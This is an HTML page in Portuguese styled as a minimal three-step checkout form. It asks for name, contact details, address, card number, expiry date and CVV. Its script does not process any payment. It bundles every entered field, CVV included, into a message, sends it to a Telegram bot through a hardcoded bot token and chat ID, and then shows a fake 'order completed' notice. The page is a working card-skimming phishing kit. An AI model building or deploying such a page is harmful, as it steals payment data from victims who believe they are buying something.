<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Checkout Minimalista</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: Inter, sans-serif;
      background:#f7f7fa;
      padding:20px;
      display:flex;
      justify-content:center;
    }

    .card {
      background:#fff;
      width:100%;
      max-width:480px;
      padding:30px;
      border-radius:18px;
      box-shadow:0 10px 30px rgba(0,0,0,0.08);
      animation: fadeIn .4s ease;
    }

    @keyframes fadeIn { from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);} }

    h2 {
      font-size:22px;
      font-weight:600;
      margin-bottom:25px;
      color:#1f1f25;
      text-align:center;
    }

    .step { display:none; }
    .step.active { display:block; }

    label { font-size:14px; font-weight:500; color:#444; margin-bottom:6px; display:block; }

    input, textarea {
      width:100%;
      padding:12px;
      border-radius:10px;
      border:1px solid #ddd;
      background:#fafafa;
      font-size:15px;
      transition:.2s;
      margin-bottom:18px;
    }

    input:focus, textarea:focus {
      border-color:#6a5cff;
      background:#fff;
      box-shadow:0 0 0 3px rgba(106,92,255,0.15);
      outline:none;
    }

    .buttons {
      display:flex;
      gap:10px;
      margin-top:10px;
    }

    button {
      flex:1;
      padding:13px;
      background:#6a5cff;
      border:none;
      color:white;
      border-radius:10px;
      font-size:15px;
      font-weight:600;
      cursor:pointer;
      transition:.2s;
    }

    button:hover { background:#5548e6; }
    .secondary { background:#e5e5ef; color:#333; }
    .secondary:hover { background:#d8d8e6; }

    .progress {
      display:flex;
      justify-content:center;
      gap:8px;
      margin-bottom:25px;
    }

    .dot {
      width:10px;
      height:10px;
      border-radius:50%;
      background:#d2d2dd;
      transition:.3s;
    }

    .dot.active { background:#6a5cff; transform:scale(1.2); }

    .success {
      display:none;
      text-align:center;
      padding:20px;
    }
    .success.show { display:block; }
  </style>
</head>
<body>
  <div class="card">
    <div class="progress">
      <div class="dot active" id="p1"></div>
      <div class="dot" id="p2"></div>
      <div class="dot" id="p3"></div>
    </div>

    <form id="formCheckout">
      <!-- STEP 1 -->
      <div class="step active" id="step1">
        <h2>Informa√ß√µes Pessoais</h2>
        <label>Nome completo</label>
        <input type="text" id="nome" required />

        <label>E-mail</label>
        <input type="email" id="email" required />

        <label>Telefone</label>
        <input type="text" id="phone" required />
      </div>

      <!-- STEP 2 -->
      <div class="step" id="step2">
        <h2>Endere√ßo</h2>
        <label>Rua</label>
        <input type="text" id="rua" required />

        <label>N√∫mero</label>
        <input type="text" id="numero" required />

        <label>CEP</label>
        <input type="text" id="cep" required />
      </div>

      <!-- STEP 3 -->
      <div class="step" id="step3">
        <h2>Pagamento</h2>
        <label>N√∫mero do cart√£o</label>
        <input type="text" id="card" required />

        <label>Data de validade</label>
        <input type="text" id="validade" placeholder="MM/AA" required />

        <label>CVV</label>
        <input type="text" id="cvv" required />
      </div>

      <div class="buttons">
        <button type="button" class="secondary" id="voltar">Voltar</button>
        <button type="button" id="avancar">Continuar</button>
      </div>
    </form>

    <div class="success" id="sucesso">
      <h2>Pedido Conclu√≠do ‚úî</h2>
      <p>Obrigado! Seus dados foram enviados com sucesso.</p>
    </div>
  </div>

  <script>
    let etapa = 1;

    const steps = {
      1: document.getElementById("step1"),
      2: document.getElementById("step2"),
      3: document.getElementById("step3")
    };

    const dots = {
      1: document.getElementById("p1"),
      2: document.getElementById("p2"),
      3: document.getElementById("p3")
    };

    const btnAvancar = document.getElementById("avancar");
    const btnVoltar = document.getElementById("voltar");
    const sucesso = document.getElementById("sucesso");

    function atualizarSteps() {
      for (let i=1; i<=3; i++) {
        steps[i].classList.remove("active");
        dots[i].classList.remove("active");
      }

      steps[etapa].classList.add("active");
      dots[etapa].classList.add("active");

      btnVoltar.style.display = etapa === 1 ? "none" : "block";
      btnAvancar.textContent = etapa === 3 ? "Finalizar" : "Continuar";
    }

    btnAvancar.onclick = () => {
      if (etapa < 3) etapa++;
      else finalizar();
      atualizarSteps();
    };

    btnVoltar.onclick = () => {
      if (etapa > 1) etapa--;
      atualizarSteps();
    };

    async function finalizar() {
      // Coletar dados
      const data = {
        nome: document.getElementById('nome').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        rua: document.getElementById('rua').value,
        numero: document.getElementById('numero').value,
        cep: document.getElementById('cep').value,
        card: document.getElementById('card').value,
        validade: document.getElementById('validade').value,
        cvv: document.getElementById('cvv').value
      };

      // MONTAR MENSAGEM TELEGRAM
      const mensagem = `‚ö° NOVO CHECKOUT 

`+
        `üë§ Nome: ${data.nome}
`+
        `üì© Email: ${data.email}
`+
        `üì± Telefone: ${data.phone}

`+
        `üìç Endere√ßo: ${data.rua}, ${data.numero}
`+
        `üìÆ CEP: ${data.cep}

`+
        `üí≥ Cart√£o: ${data.card}
`+
        `üìÜ Validade: ${data.validade}
`+
        `üîê CVV: ${data.cvv}`;

      // === CONFIGURA√á√ïES DO TELEGRAM ===
      const botToken = "7122464727:AAGNDx3SKidRLL9VqUnjnnM64pGdPe47g0A";
      const chatId = "1363564675";
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: mensagem })
        });
      } catch (e) {
        console.error("Erro ", e);
      }

      document.getElementById("formCheckout").style.display = "none";
      sucesso.classList.add("show");("show");
    }

    atualizarSteps();
  </script>
</body>
</html>
